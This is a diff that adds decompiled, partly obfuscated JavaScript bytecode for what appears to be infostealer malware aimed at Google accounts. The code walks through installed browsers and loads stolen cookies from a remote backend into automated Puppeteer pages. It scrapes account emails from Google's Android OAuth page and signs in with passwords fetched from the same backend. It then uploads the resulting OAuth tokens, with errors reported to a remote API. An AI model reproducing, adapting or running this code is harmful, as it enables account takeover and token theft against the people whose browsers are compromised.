@@ -1,0 +1,636 @@
+function func_selectAccount_0x1000006e2(a0, a1, a2, a3)
+{
+	r7 = <closure>
+	r8 = <this>
+	ACCU = func_o_0x1000006e0
+	try
+	{
+		r8 = console["info"]
+		ACCU = r8("Selecting account", a2)
+		r8 = a1["click"]
+		r10 = ("div[data-identifier=\"" + a2)
+		r10 = (r10 + "\"]")
+		r9 = r8(r10)
+		r8 = await r9
+		r9 = _GeneratorGetResumeMode(Scope[10734])
+		if (!r9 === 0)
+		{
+			ACCU = r8
+		}
+		r8 = console["info"]
+		ACCU = r8("Authenticating")
+		r9 = r3
+		r9 = func_authenticate_0x1000006b1(a0, a1, a3)
+		r8 = await r9
+		r9 = _GeneratorGetResumeMode(Scope[10734])
+		if (!r9 === 0)
+		{
+			ACCU = r8
+		}
+		r4 = r8["userId"]
+		r5 = r8["token"]
+		r8 = console["info"]
+		ACCU = r8("Saving token")
+		r9 = global_iB["google"]["saveOAuthToken"]
+		r8 = r9["mutate"]
+		r10 = new {"userId": null, "scope": null, "value": null}
+		r10["userId"] = r4
+		r10["scope"] = "ANDROID"
+		r10["value"] = r5
+		r9 = r8(r10)
+		r8 = await r9
+		r9 = _GeneratorGetResumeMode(Scope[10734])
+		if (!r9 === 0)
+		{
+			ACCU = r8
+		}
+		r9 = undefined
+		ACCU = r9
+		return r9
+	}
+	catch {}
+	r8 = ACCU
+	ACCU = null
+	ACCU = Scope[10735]
+	return Scope[10735][2]
+}
+function func_processOAuth_0x1000006df(a0, a1)
+{
+	r15 = <closure>
+	r16 = <this>
+	ACCU = func_o_0x1000006d9
+	try
+	{
+		r1 = new {"V": "p[w*", "J": 115359, "S": "[Jy3", "g": 120951, "L": "toM2", "X": 14591, "j": "VHeU", "E": 18177, "c": "9hYk", "x": 66374, "K": "eeST", "u": 28853, "A": "iSZ6", "s": 47236, "b": "m[K#", "i": 83665, "w": "C0qY", "f": 25231, "t": "nvO5", "P": 121003, "I": ")Ku4", "p": 17723, "o": "]1@2", "R": 3391, "v": "toM2", "N": 81796, "M": "%]hf", "k": 123987, "Q": "JrBU", "W": 95064, "T": "n@A0", "G": 4760, "y": "]C&)", "e": 15494, "U": "XR6@", "q": 89296, "O": "mwAz", "C": 87929, "n": "M2Ty", "r": 71903, "H": "[Jy3", "h": 80165, "Y": "p8sI", "D": 82420, "l": "p[w*", "a": 116017, "V0": ")Lyh", "V1": 118585, "V2": "kh^v", "V3": 84188, "V6": 89168, "VV": "^Ceg", "VJ": 71255, "Vz": "b48I", "Vd": 81264, "Vg": "h98j", "VL": 20200, "Vc": 83929}
+		r16 = a0["newPage"]
+		r17 = r16()
+		r16 = await r17
+		r17 = _GeneratorGetResumeMode(Scope[10736])
+		if (!r17 === 0)
+		{
+			ACCU = r16
+		}
+		r3 = r16
+		r16 = r3["setCookie"]
+		r18 = func_normalizeCookies_0x100000691(a1)
+		r17 = r16(...r3, r18)
+		r16 = await r17
+		r17 = _GeneratorGetResumeMode(Scope[10736])
+		if (!r17 === 0)
+		{
+			ACCU = r16
+		}
+		r16 = r3["close"]
+		r17 = r16()
+		r16 = await r17
+		r17 = _GeneratorGetResumeMode(Scope[10736])
+		if (!r17 === 0)
+		{
+			ACCU = r16
+		}
+		r16 = console["info"]
+		ACCU = r16("Creating OAuth page")
+		r17 = func_openPage_0x1000006a8(a0)
+		r16 = await r17
+		r17 = _GeneratorGetResumeMode(Scope[10736])
+		if (!r17 === 0)
+		{
+			ACCU = r16
+		}
+		r5 = r16["page"]
+		r16 = console["info"]
+		ACCU = r16("Getting emails")
+		r17 = func_getEmails_0x1000006ab(r5)
+		r16 = await r17
+		r17 = _GeneratorGetResumeMode(Scope[10736])
+		if (!r17 === 0)
+		{
+			ACCU = r16
+		}
+		r6 = r16
+		r17 = global_iB["google"]["getPasswords"]
+		r19 = r1["Y"]
+		r20 = r1["D"]
+		r16 = r17["query"]
+		r17 = r16(r6)
+		r16 = await r17
+		r17 = _GeneratorGetResumeMode(Scope[10736])
+		if (!r17 === 0)
+		{
+			ACCU = r16
+		}
+		r7 = r16
+		r17 = GetIterator(r6)
+		r16 = r17["next"]
+		ACCU = false
+		r18 = false
+		try
+		{
+			while (true)
+			{
+				r18 = true
+				r22 = r16()
+				if (r22["done"]) break
+				r18 = false
+				r10 = r22["value"]
+				ACCU = r7[r22["value"]]
+				r11 = r7[r22["value"]]
+				r22 = r22["value"]
+				r23 = ACCU
+				if (!ACCU == undefined)
+				{
+					ACCU = r23["length"]
+				}
+				else
+				{
+					ACCU = undefined
+				}
+				if (!ACCU)
+				{
+					continue
+				}
+				r23 = console["info"]
+				r25 = "Processing "
+				r25 = (r25 + r10)
+				ACCU = r23(r25)
+				r27 = r1["VJ"]
+				r24 = func_openPage_0x1000006a8(a0)
+				r23 = await r24
+				r24 = _GeneratorGetResumeMode(Scope[10736])
+				if (!r24 === 0)
+				{
+					ACCU = r23
+				}
+				r12 = r23["page"]
+				ACCU = r23["cursor"]
+				try
+				{
+					try
+					{
+						r28 = r2
+						r32 = r10
+						r33 = r11
+						r28 = func_selectAccount_0x1000006e2(r23["page"], r23["cursor"], r32, r33)
+						r27 = await r28
+						r28 = _GeneratorGetResumeMode(Scope[10736])
+						if (!r28 === 0)
+						{
+							ACCU = r27
+						}
+						ACCU = r27
+					}
+					catch
+					{
+						r27 = ACCU
+						ACCU = null
+						ACCU = Scope[10737]
+						r32 = new {"email": null}
+						r32["email"] = r10
+						r29 = r2
+						ACCU = func_pushError_0x100000142(Scope[10737][2], r32)
+					}
+					ACCU = -1
+					r24 = -1
+					r23 = -1
+				}
+				catch
+				{
+					r24 = ACCU
+					r23 = 0
+				}
+				r26 = r12["close"]
+				r27 = r26()
+				r26 = await r27
+				r27 = _GeneratorGetResumeMode(Scope[10736])
+				if (!r27 === 0)
+				{
+					ACCU = r26
+				}
+				ACCU = null
+				if (!r23 === 0) continue
+				ACCU = 0
+				r19 = 0
+				r20 = r24
+				break
+			}
+			ACCU = -1
+			r20 = -1
+			r19 = -1
+		}
+		catch
+		{
+			r20 = ACCU
+			r19 = 0
+		}
+		if (!r18)
+		{
+			try
+			{
+				if (!r17["return"] == undefined)
+				{
+					ACCU = r17["return"]()
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r19 === 0)
+		{
+			ACCU = r20
+		}
+		r17 = undefined
+		ACCU = r17
+		return r17
+	}
+	catch {}
+	r16 = ACCU
+	ACCU = null
+	ACCU = Scope[10738]
+	return Scope[10738][2]
+}
+function func_processBrowsers_0x1000006d8(a0, a1)
+{
+	r9 = <closure>
+	r10 = <this>
+	ACCU = func_u_0x1000006d6
+	try
+	{
+		r11 = GetIterator(a1)
+		r10 = r11["next"]
+		ACCU = false
+		r12 = false
+		try
+		{
+			while (true)
+			{
+				r12 = true
+				r16 = r10()
+				if (r16["done"]) break
+				r12 = false
+				r17 = a0["createBrowserContext"]
+				r18 = r17()
+				r17 = await r18
+				r18 = _GeneratorGetResumeMode(Scope[10739])
+				if (!r18 === 0)
+				{
+					ACCU = r17
+				}
+				r7 = r17
+				r19 = r3
+				r21 = r7
+				r18 = func_processOAuth_0x1000006df(r21, r16["value"])
+				r17 = r18["catch"]
+				r18 = r17(func_pushError_0x100000142)
+				r17 = await r18
+				r18 = _GeneratorGetResumeMode(Scope[10739])
+				if (!r18 === 0)
+				{
+					ACCU = r17
+				}
+				r17 = r7["close"]
+				r18 = r17()
+				r17 = await r18
+				r18 = _GeneratorGetResumeMode(Scope[10739])
+				if (r18 === 0) continue
+				ACCU = r17
+				ACCU = r17
+			}
+			ACCU = -1
+			r14 = -1
+			r13 = -1
+		}
+		catch
+		{
+			r14 = ACCU
+			r13 = 0
+		}
+		if (!r12)
+		{
+			try
+			{
+				if (!r11["return"] == undefined)
+				{
+					ACCU = r11["return"]()
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r13 === 0)
+		{
+			ACCU = r14
+		}
+		r11 = undefined
+		ACCU = r11
+		return r11
+	}
+	catch {}
+	r10 = ACCU
+	ACCU = null
+	ACCU = Scope[10740]
+	return Scope[10740][2]
+}
+function func_processBrowsers_0x1000006d5()
+{
+	r14 = <closure>
+	r15 = <this>
+	ACCU = func_r_0x1000006d2
+	try
+	{
+		r1 = new {"V": "p[w*", "J": 20124, "S": "YbH*", "g": 69406, "L": "vV[N", "X": 45906, "j": "*!!t", "E": 34879, "c": "BS4&", "x": 26566, "K": "h^gm", "u": 118610, "A": 84286, "s": "[()[", "b": 28847, "i": "epz[", "w": 58388, "f": 105644, "t": "b48I", "P": 25870, "I": "iSZ6", "p": 21223, "o": "Yx9u", "R": 43568, "v": "93y[", "N": 62722, "M": "9hYk", "k": 27609, "Q": "kh^v", "W": 41985, "T": "xQ)2", "G": 33813, "y": ")Lyh", "e": 72582, "U": "C0qY", "q": 107157, "O": "m[K#", "C": 119165, "n": "B@Sb", "r": 56629}
+		r18 = r1["V"]
+		r19 = r1["j"]
+		r17 = global_dK["iterInstalledBrowsers"]()
+		r16 = GetIterator(r17)
+		r15 = r16["next"]
+		ACCU = false
+		r17 = false
+		try
+		{
+			while (true)
+			{
+				r17 = true
+				r21 = r15()
+				if (r21["done"]) break
+				r17 = false
+				r7 = r21["value"]
+				r22 = console["info"]
+				r24 = "Processing "
+				r24 = (r24 + r21["value"]["application"])
+				ACCU = r22(r24)
+				r23 = global_iB["google"]
+				r23 = r23["getCookies"]
+				r22 = r23["query"]
+				r28 = r1["k"]
+				r23 = r22(r21["value"]["application"])
+				r21 = r21["value"]
+				r22 = await r23
+				r23 = _GeneratorGetResumeMode(Scope[10741])
+				if (!r23 === 0)
+				{
+					ACCU = r22
+				}
+				r8 = r22
+				if (r8 == undefined) continue
+				r22 = Generator(ToObject(r8))
+				ACCU = 0
+				r26 = 0
+				while (true)
+				{
+					if (!GeneratorContinue(r26)) continue
+					if (r22.next().value == undefined) continue
+					r4 = r22.next().value
+					r10 = r22.next().value
+					ACCU = r8[r4]
+					r11 = r8[r4]
+					try
+					{
+						r28 = r7["launch"]
+						r29 = r28()
+						r28 = await r29
+						r29 = _GeneratorGetResumeMode(Scope[10741])
+						if (!r29 === 0)
+						{
+							ACCU = r28
+						}
+						r12 = r28
+						r33 = Object["values"](r11)
+						r30 = r2
+						r32 = r12
+						r29 = func_processBrowsers_0x1000006d8(r32, r33)
+						r28 = r29["catch"]
+						r29 = r28(func_pushError_0x100000142)
+						r28 = await r29
+						r29 = _GeneratorGetResumeMode(Scope[10741])
+						if (!r29 === 0)
+						{
+							ACCU = r28
+						}
+						r28 = r12["close"]
+						r29 = r28()
+						r28 = await r29
+						r29 = _GeneratorGetResumeMode(Scope[10741])
+						if (!r29 === 0)
+						{
+							ACCU = r28
+						}
+						ACCU = r28
+						continue
+					}
+					catch {}
+					r28 = ACCU
+					ACCU = null
+					ACCU = Scope[10742]
+					ACCU = func_pushError_0x100000142(Scope[10742][2])
+					r26 = GeneratorStep(r26)
+				}
+			}
+			ACCU = -1
+			r19 = -1
+			r18 = -1
+		}
+		catch
+		{
+			r19 = ACCU
+			r18 = 0
+		}
+		if (!r17)
+		{
+			try
+			{
+				if (!r16["return"] == undefined)
+				{
+					ACCU = r16["return"]()
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r18 === 0)
+		{
+			ACCU = r19
+		}
+		r16 = undefined
+		ACCU = r16
+		return r16
+	}
+	catch {}
+	r15 = ACCU
+	ACCU = null
+	ACCU = Scope[10743]
+	return Scope[10743][2]
+}
+function func_getEmails_0x1000006ab(a0)
+{
+	r5 = <closure>
+	r6 = <this>
+	ACCU = func_r_0x1000006a9
+	Scope[10763][3] = func_r_0x1000006a9
+	try
+	{
+		r7 = a0["$$"]("div[data-email]")
+		r6 = await r7
+		r7 = _GeneratorGetResumeMode(Scope[10763])
+		if (!r7 === 0)
+		{
+			ACCU = r6
+		}
+		r3 = r6
+		r6 = Promise["all"]
+		r8 = r3["map"]
+		r8 = r8(func_innerText_0x1000006aa)
+		r7 = r6(r8)
+		ACCU = r7
+		return r7
+	}
+	catch {}
+	r6 = ACCU
+	ACCU = null
+	ACCU = Scope[10764]
+	return Scope[10764][2]
+}
+function func_openPage_0x1000006a8(a0)
+{
+	r7 = <closure>
+	r8 = <this>
+	ACCU = func_r_0x1000006a6
+	try
+	{
+		r8 = a0["newPage"]
+		r9 = r8()
+		r8 = await r9
+		r9 = _GeneratorGetResumeMode(Scope[10765])
+		if (!r9 === 0)
+		{
+			ACCU = r8
+		}
+		r4 = r8
+		r9 = (func_unknown_0x1000017d7["exports"]())
+		ACCU = (func_unknown_0x1000017d7["exports"]())["createCursor"](r4)
+		r5 = (func_unknown_0x1000017d7["exports"]())["createCursor"](r4)
+		try
+		{
+			r9 = r4["goto"]
+			r12 = new {"waitUntil": null}
+			r12["waitUntil"] = "networkidle2"
+			r10 = r9(("https://accounts.google.com/o/android/auth?return_user_id=true"), r12)
+			r9 = await r10
+			r10 = _GeneratorGetResumeMode(Scope[10765])
+			if (!r10 === 0)
+			{
+				ACCU = r9
+			}
+			r10 = r3
+			r10 = func_signin_0x1000006bb(r4, r5)
+			r9 = await r10
+			r10 = _GeneratorGetResumeMode(Scope[10765])
+			if (!r10 === 0)
+			{
+				ACCU = r9
+			}
+			r9 = new {"page": null, "cursor": null}
+			r9["page"] = r4
+			r9["cursor"] = r5
+			r10 = r9
+			ACCU = r10
+			return r10
+		}
+		catch {}
+		r9 = ACCU
+		ACCU = null
+		ACCU = Scope[10766]
+		r10 = r4["close"]
+		r11 = r10()
+		r10 = await r11
+		r11 = _GeneratorGetResumeMode(Scope[10765])
+		if (!r11 === 0)
+		{
+			ACCU = r10
+		}
+		ACCU = Scope[10766][2]
+	}
+	catch {}
+	r8 = ACCU
+	ACCU = null
+	ACCU = Scope[10767]
+	return Scope[10767][2]
+}
+function func_normalizeCookies_0x100000691(a0)
+{
+	r2 = []
+	r13 = GetIterator(a0)
+	r12 = r13["next"]
+	ACCU = false
+	r14 = false
+	try
+	{
+		while (true)
+		{
+			r14 = true
+			r18 = r12()
+			if (r18["done"]) break
+			r14 = false
+			r10 = _CopyDataPropertiesWithExcludedPropertiesOnStack(r18["value"], "host", "sameSite")
+			r19 = r2["push"]
+			r21 = new {"domain": null, "sameSite": null, "secure": <true}
+			r21["domain"] = r18["value"]["host"]
+			r21["sameSite"] = func_sameSite_0x1000006a3(r18["value"]["sameSite"])
+			r22 = r21
+			r23 = r10
+			ACCU = _CopyDataProperties(r22, r23)
+			ACCU = r19(r21)
+		}
+		ACCU = -1
+		r16 = -1
+		r15 = -1
+	}
+	catch
+	{
+		r16 = ACCU
+		r15 = 0
+	}
+	if (!r14)
+	{
+		try
+		{
+			if (!r13["return"] == undefined)
+			{
+				ACCU = r13["return"]()
+			}
+			catch {}
+		}
+	}
+	ACCU = null
+	if (r15 === 0)
+	{
+		ACCU = r16
+	}
+	return r2
+}
+function func_pushError_0x100000142(a0, a1)
+{
+	r0 = new {"V": "b48I", "J": 97714, "S": "epz[", "g": 117612, "L": "epz[", "X": 95913, "j": "89J2", "E": 59689}
+	r5 = new {"KhfBD": null}
+	r5["KhfBD"] = func_instanceof_0x100000141
+	r4 = r5["KhfBD"]
+	ACCU = r4(a0, Error)
+	if (r4(a0, Error))
+	{
+		ACCU = a0
+	}
+	else
+	{
+		ACCU = Error
+		ACCU = Error(r0)
+	}
+	r2 = ACCU
+	r4 = global_tP["api"]["pushError"]
+	r7 = new {"context": null}
+	r7["context"] = a1
+	ACCU = r4(r2, r7)
+	return undefined
+}
+function func_instanceof_0x100000141(a0, a1)
+{
+	return a0 instanceof a1
+}
